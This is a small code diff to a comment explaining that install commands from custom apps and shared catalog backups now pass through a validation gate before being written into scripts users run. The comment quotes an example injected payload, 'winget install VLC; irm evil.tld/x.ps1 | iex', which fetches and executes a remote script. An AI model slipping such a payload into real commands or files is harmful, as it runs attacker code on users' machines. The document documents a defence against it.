@@ -7,7 +7,7 @@
 // Custom apps let people bring their own install commands, and a catalog
 // backup file can be shared between users. Both flows used to hand raw
 // strings to Batch Install, which drops them into a PowerShell/Bash script
-// the user is told to copy and run — so a crafted "catalog backup" could
+// the user is told to copy and run, so a crafted "catalog backup" could
 // smuggle extra shell statements (`winget install VLC; irm evil.tld/x.ps1
 // | iex`) into a victim's script. Every command now passes through this
 // gate before it is stored, imported, or written into a script:
